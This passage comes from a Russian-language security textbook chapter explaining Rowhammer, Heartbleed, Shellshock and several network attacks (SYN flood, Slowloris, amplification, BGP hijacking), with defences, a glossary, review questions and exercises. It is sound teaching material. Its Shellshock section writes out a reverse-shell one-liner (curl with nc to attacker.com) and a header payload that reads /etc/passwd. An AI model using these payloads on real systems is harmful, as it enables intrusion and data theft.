- **Escape из виртуальной машины** (VM → хост)
- **Обход защиты памяти** (изменение page table → доступ к kernel memory)
- **Повышение привилегий** (изменение uid в памяти: `uid=1000` → `uid=0` (root))

**Реальный пример — Google Project Zero (2015)**:

Исследователи использовали Rowhammer для:
- **Побега из Chrome sandbox** (Native Client)
- **Получения root на Android** (изменение memory management unit)

**Защита**:
- **ECC память** (Error-Correcting Code) — автоматическое исправление ошибок (дорого, используется в серверах)
- **Target Row Refresh (TRR)** — новые чипы DRAM следят за частотой обращений и делают refresh соседних строк
- **Ограничение clflush** (процессор не даёт сбрасывать кэш слишком часто)

**Вывод**: Можно атаковать **память физически**, даже без багов в коде.

---

### Heartbleed (2014)

**Определение**: Buffer overflow в **OpenSSL** (библиотека для HTTPS), позволяющий читать **64 КБ памяти сервера** за один запрос.

**Суть уязвимости**:

OpenSSL реализует расширение TLS **Heartbeat** (проверка, что соединение живо):
1. Клиент отправляет: `"ping"` (4 байта) + длина `4`
2. Сервер отвечает: `"ping"` (эхо)

**Баг**:
```c
// Уязвимый код OpenSSL
unsigned int payload_length = request->length;  // Клиент указывает длину
memcpy(response, request->payload, payload_length);  // НЕТ ПРОВЕРКИ РЕАЛЬНОЙ ДЛИНЫ!
```

**Эксплойт**:
1. Хакер отправляет: `"A"` (1 байт) + длина `65535` (врёт о длине!)
2. Сервер копирует **65535 байт** из памяти → отправляет хакеру

**Результат**: Хакер получает **случайный кусок памяти сервера**:
- Пароли пользователей
- Session cookies
- Приватные ключи SSL-сертификатов (!!!!)

**Реальные последствия**:
- Затронуто **17%** всех HTTPS-серверов (~500,000 сайтов)
- Yahoo, Imgur, OKCupid, Eventbrite и др.
- **Канадское налоговое агентство**: украдены данные **900 налогоплательщиков**, сайт закрыли на 6 часов

**Защита**:
- **Обновить OpenSSL** до версии 1.0.1g (патч вышел через 2 дня после раскрытия)
- **Перевыпустить SSL-сертификаты** (т.к. приватные ключи могли утечь)
- **Сменить пароли** (т.к. могли утечь session cookies)

**Урок**: Даже **один байт** неправильного кода в критичной библиотеке может взломать половину интернета.

---

### Shellshock (2014)

**Определение**: Уязвимость в **Bash** (Unix shell), позволяющая выполнять произвольные команды через **переменные окружения**.

**Суть уязвимости**:

Bash позволяет определять функции через переменные окружения:
```bash
export myfunction='() { echo "Hello"; }'
```

**Баг**: Bash **выполнял код** после определения функции:
```bash
export myfunction='() { echo "Hello"; }; echo "PWNED"'
```

При запуске bash → выполнится `echo "PWNED"`.

**Эксплойт через CGI**:

Веб-серверы передают HTTP-заголовки в переменные окружения:
```bash
HTTP_USER_AGENT="() { :; }; /bin/bash -c 'cat /etc/passwd'"
```

Когда CGI-скрипт запускает Bash → **выполняется произвольная команда**.

**Реальный пример**:
```bash
curl -A "() { :; }; /bin/bash -c 'nc attacker.com 1234 -e /bin/sh'" http://victim.com/cgi-bin/script.sh
```

Сервер выполнит обратное подключение (reverse shell) → хакер получит доступ.

**Последствия**:
- Затронуты **миллионы серверов** (Linux, macOS, роутеры, IoT-устройства)
- **Ботнет Mayhem** использовал Shellshock для заражения серверов

**Защита**:
- **Обновить Bash** (патч вышел за 1 день)
- **Отключить CGI** (если не используется)
- **WAF (Web Application Firewall)** — блокировка запросов с `() { :; };`

---

## 9.6.7. Сетевые атаки (детали): Как ломать TCP/IP на низком уровне

### TCP SYN Flood

**Суть**: **Переполнение очереди** полуоткрытых TCP-соединений.

**Как работает TCP handshake** (трёхстороннее рукопожатие):
```
Клиент → SYN → Сервер
Сервер → SYN-ACK → Клиент
Клиент → ACK → Сервер
```

**Атака**:
1. Хакер отправляет миллионы **SYN-пакетов** с **поддельными IP** (IP spoofing)
2. Сервер отвечает **SYN-ACK** и ждёт **ACK** (но ACK никогда не придёт, т.к. IP поддельный)
3. Сервер держит полуоткрытое соединение в очереди (обычно **~1 минута**)
4. Очередь переполняется → **легитимные клиенты не могут подключиться**

**Защита — SYN Cookies**:

Сервер **не хранит** состояние полуоткрытых соединений. Вместо этого:
1. Сервер вычисляет **SYN Cookie** на основе IP/порта/времени
2. Отправляет SYN-ACK с **sequence number = SYN Cookie**
3. Когда приходит ACK → сервер проверяет, что `ack_number - 1 == SYN Cookie`
4. Если да → соединение валидное, создаём запись в таблице

**Результат**: Атака неэффективна, т.к. сервер не тратит ресурсы на хранение состояния.

---

### Slowloris

**Суть**: **Медленная атака**, держит HTTP-соединения открытыми, не завершая запрос.

**Как работает**:
1. Хакер открывает **тысячи HTTP-соединений**
2. Отправляет **неполный HTTP-запрос**:
   ```
   GET / HTTP/1.1
   Host: victim.com
   User-Agent: Mozilla/5.0
   ```
   (заголовки не завершены, нет двойного `\r\n`)
3. Каждые **10 секунд** отправляет ещё **один заголовок**:
   ```
   X-a: b
   ```
4. Сервер **ждёт завершения запроса** → держит соединение открытым
5. Все worker-потоки заняты → **новые клиенты не могут подключиться**

**Защита**:
- **Таймаут на получение заголовков** (например, 10 секунд)
- **Ограничение числа соединений с одного IP**
- **nginx/Apache mod_reqtimeout**

---

### Amplification Attack (Атака усиления)

**Суть**: Использование **третьих серверов** для усиления трафика.

**Пример — DNS Amplification**:
1. Хакер отправляет **DNS-запрос** на публичный DNS-сервер с **поддельным IP жертвы**:
   ```
   Запрос: "Дай все записи для example.com" (60 байт)
   Ответ: [огромный список записей] (4000 байт)
   ```
   **Коэффициент усиления**: 4000 / 60 ≈ **70x**

2. DNS-сервер отправляет ответ **жертве** (т.к. IP поддельный)

3. Хакер использует **тысячи DNS-серверов** → жертва получает **гигабиты** трафика

**Рекорд — GitHub DDoS (2018)**:
- **1.35 Тбит/сек** (терабит в секунду!)
- Использовали **Memcached amplification** (коэффициент усиления: **51,000x**)

**Защита**:
- **Rate limiting** на DNS/NTP/Memcached серверах
- **BCP38** (блокировка пакетов с поддельными source IP)
- **DDoS-защита** (Cloudflare, Akamai)

---

### BGP Hijacking (Перехват маршрутизации)

**Суть**: Перехват **маршрутов BGP** (протокол маршрутизации в интернете), чтобы **перенаправить трафик** через сервер хакера.

**Как работает BGP**:
- **Автономные системы (AS)** объявляют: "Я владею IP-префиксом 1.2.3.0/24"
- Роутеры обмениваются этими объявлениями → строят таблицу маршрутизации

**Атака**:
1. Хакер (или злонамеренный AS) объявляет: "Я владею 8.8.8.0/24" (IP Google DNS)
2. Интернет-роутеры **верят** (BGP не имеет аутентификации!)
3. Трафик на 8.8.8.8 **идёт через хакера** → MITM

**Реальный пример — Pakistan Telecom (2008)**:

Pakistan Telecom попыталась заблокировать YouTube в Пакистане:
- Объявила маршрут к YouTube в BGP
- Из-за неправильной настройки объявление распространилось **глобально**
- **Весь мир** не мог зайти на YouTube в течение **2 часов**

**Защита**:
- **RPKI (Resource Public Key Infrastructure)** — криптографическая проверка владения IP-префиксами
- **BGP monitoring** (обнаружение подозрительных изменений маршрутов)

---

## Ключевые термины

- **Buffer Overflow** — переполнение буфера, запись за границы массива
- **Heap Overflow** — переполнение кучи, перезапись метаданных менеджера памяти
- **Format String** — уязвимость через форматные строки (printf)
- **Integer Overflow** — переполнение целых чисел
- **Race Condition** — состояние гонки, ошибка синхронизации потоков
- **TOCTOU** — Time-Of-Check-Time-Of-Use, race condition при проверке и использовании
- **IDOR** — Insecure Direct Object Reference, доступ к чужим данным через ID
- **Path Traversal** — обход путей через `../`
- **Command Injection** — выполнение shell-команд через пользовательский ввод
- **XXE** — XML External Entity, атака через парсинг XML
- **SSRF** — Server-Side Request Forgery, заставить сервер сделать запрос
- **Padding Oracle** — атака на CBC-режим через оракул заполнения
- **Timing Attack** — определение секрета по времени выполнения
- **Replay Attack** — повтор перехваченного запроса
- **Downgrade Attack** — принуждение к слабому шифрованию
- **Birthday Attack** — поиск коллизий хеш-функций
- **Privilege Escalation** — повышение привилегий (horizontal/vertical)
- **Backdoor** — скрытый метод доступа
- **Rootkit** — набор инструментов для скрытия присутствия хакера
- **Meltdown/Spectre** — аппаратные уязвимости CPU (спекулятивное выполнение)
- **Rowhammer** — физическая атака на DRAM (изменение битов)
- **Heartbleed** — buffer overflow в OpenSSL
- **Shellshock** — уязвимость в Bash (выполнение команд через переменные окружения)
- **TCP SYN Flood** — переполнение очереди полуоткрытых TCP-соединений
- **Slowloris** — медленная атака, держит HTTP-соединения открытыми
- **Amplification Attack** — усиление трафика через третьи серверы
- **BGP Hijacking** — перехват маршрутов BGP
- **ASLR** — Address Space Layout Randomization, рандомизация адресов памяти
- **DEP/NX** — Data Execution Prevention / No-eXecute, запрет выполнения кода из стека
- **Stack Canary** — канарейка в стеке (защита от buffer overflow)
- **SYN Cookies** — защита от TCP SYN Flood (не храним состояние полуоткрытых соединений)
- **0-day exploit** — эксплойт для неизвестной уязвимости (нет патча)

---

## Контрольные вопросы

1. **Что такое Buffer Overflow и как он позволяет выполнить произвольный код?** Опишите механизм перезаписи Return Address в стеке. Какие защиты существуют (ASLR, DEP, Stack Canary)?

2. **В чём отличие Stack Overflow от Heap Overflow?** Почему Heap Overflow сложнее эксплуатировать, но опаснее?

3. **Что такое Format String Vulnerability?** Приведите пример уязвимого кода. Как `%n` позволяет писать в память?

4. **Объясните Integer Overflow. Как переполнение `unsigned int` может привести к Buffer Overflow?** Приведите пример с `malloc(size + 1)`.

5. **Что такое Race Condition и TOCTOU?** Приведите пример атаки на банковское приложение (двойное списание средств). Как защититься (транзакции, locks, atomic операции)?

6. **Что такое IDOR? Почему UUID лучше, чем последовательные ID?** Приведите реальный пример (Parler, 2021).

7. **Объясните Path Traversal. Как `../../etc/passwd` позволяет читать системные файлы?** Как защититься (whitelist, canonicalization)?

8. **Что такое XXE (XML External Entity)? Как через XML можно прочитать файл `/etc/passwd`?** Приведите пример payload.

9. **Что такое SSRF? Как через SSRF можно украсть AWS credentials?** Опишите атаку на метаданные облака (`169.254.169.254`).

10. **Объясните Padding Oracle Attack. Как сервер становится "оракулом" для расшифровки CBC?** Почему важно возвращать одинаковые ошибки для padding и signature?

11. **Что такое Timing Attack? Как по времени выполнения можно узнать пароль?** Почему `hmac.compare_digest()` защищает от timing attacks?

12. **Что такое Replay Attack? Как nonce и timestamp защищают от повтора запросов?**

13. **Что такое Privilege Escalation? В чём разница между Horizontal и Vertical?** Приведите пример вертикального повышения (Dirty COW).

14. **Что такое Rootkit? В чём разница между User-mode и Kernel-mode rootkit?** Как rootkit скрывает процессы (hooking системных вызовов)?

15. **Объясните уязвимости Meltdown и Spectre. Что такое спекулятивное выполнение?** Почему CPU исполняет код до проверки условия? Как через cache timing attack можно прочитать kernel memory?

16. **Что такое Rowhammer? Как можно физически изменить биты в DRAM?** Как через Rowhammer повысить привилегии (изменение page table)?

17. **Объясните Heartbleed. Как buffer overflow в OpenSSL позволял читать 64 КБ памяти сервера?** Что могло утечь (пароли, session cookies, приватные ключи)?

18. **Что такое Shellshock? Как через переменные окружения Bash можно выполнить произвольные команды?** Приведите пример эксплойта через CGI.

19. **Объясните TCP SYN Flood. Как SYN Cookies защищают от атаки?** Почему сервер не хранит состояние полуоткрытых соединений?

20. **Что такое BGP Hijacking? Как перехватить маршруты BGP и сделать MITM?** Приведите реальный пример (Pakistan Telecom, 2008).

---

## Практические задачи

**Задача 1. Buffer Overflow**

Дан код:
```c
void vuln(char *input) {
    char buffer[10];
    strcpy(buffer, input);
}
```

**Вопросы:**
- Сколько байт нужно передать, чтобы перезаписать Return Address (предположим, Saved EBP занимает 4 байта)?
- Как ASLR усложняет эксплуатацию?

**Ответ**: Нужно передать 10 (buffer) + 4 (Saved EBP) + 4 (Return Address) = **18 байт**.  
ASLR рандомизирует адреса → хакер не знает, куда писать адрес shellcode.

---

**Задача 2. Race Condition**

Два потока одновременно переводят деньги:
```python
balance = 100
# Поток 1:
if balance >= 100: balance -= 100
# Поток 2:
if balance >= 100: balance -= 100
```

**Вопрос**: Каким может быть итоговый баланс?

**Ответ**: 0 или -100 (если оба потока прошли проверку `balance >= 100` до вычитания).

---

**Задача 3. Timing Attack**

Функция сравнения паролей:
```python
def check(password):
    correct = "secret123"
    for i in range(len(correct)):
        if password[i] != correct[i]:
            return False
    return True
```

**Вопрос**: Сколько попыток нужно, чтобы подобрать пароль длиной 9 символов (алфавит: a-z, 0-9)?

**Ответ без timing attack**: 36⁹ ≈ **10¹⁴** попыток.  
**Ответ с timing attack**: 9 × 36 = **324** попытки (перебираем по одному символу).

---

**Задача 4. Birthday Attack на MD5**

MD5 выдаёт **128-битный хеш**. Сколько попыток нужно, чтобы найти коллизию?

**Ответ**: √(2¹²⁸) = **2⁶⁴ ≈ 10¹⁹** операций (уже реально на практике, коллизии MD5 найдены).

---

**Задача 5. Heartbleed**

Сервер имеет 16 ГБ оперативной памяти. За один запрос Heartbleed можно прочитать **64 КБ**. Сколько запросов нужно, чтобы прочитать всю память?

**Ответ**: (16 × 1024 МБ × 1024 КБ) / 64 КБ = **262,144 запроса**.  
(На практике хватает **нескольких тысяч** запросов, чтобы украсть пароли/ключи.)

---

**Вывод главы**

Мы разобрали **технические детали атак**:
- **Эксплуатация памяти** (Buffer Overflow, Heap Overflow, Format String, Integer Overflow)
- **Логические уязвимости** (Race Condition, IDOR, Path Traversal, Command Injection, XXE, SSRF)
- **Криптографические атаки** (Padding Oracle, Timing Attack, Replay Attack, Downgrade Attack, Birthday Attack)
- **Повышение привилегий** (Dirty COW, SUID, sudo misconfiguration)
- **Backdoor и Rootkit** (webshell, SSH-ключи, hooking системных вызовов, bootkit)
- **Аппаратные уязвимости** (Meltdown/Spectre, Rowhammer, Heartbleed, Shellshock)
- **Сетевые атаки** (TCP SYN Flood, Slowloris, Amplification, BGP Hijacking)

**Главный урок**: **Уязвимости везде** — в коде, в железе, в протоколах, в криптографии. Нет идеальной защиты. **Безопасность — это процесс**, а не состояние. Обновляй софт, используй защиты (ASLR, DEP, SYN Cookies), проводи code review, думай как хакер.

И помни: **Если твой код может сломаться — он сломается**. Если хакер может его взломать — он взломает. Поэтому пиши безопасный код с первого дня, а не добавляй безопасность "потом" (спойлер: "потом" никогда не наступит).
